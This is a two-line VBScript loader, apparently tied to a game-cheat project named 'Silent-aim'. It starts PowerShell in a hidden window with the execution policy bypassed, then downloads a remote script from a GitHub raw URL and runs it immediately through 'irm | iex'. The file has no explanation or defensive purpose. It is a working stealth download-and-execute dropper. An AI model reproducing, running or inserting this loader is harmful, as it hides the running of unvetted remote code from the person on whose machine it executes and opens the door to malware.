Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""irm 'https://raw.githubusercontent.com/hatefulmatt/Silent-aim/refs/heads/main/Ps1' | iex""", 0, False
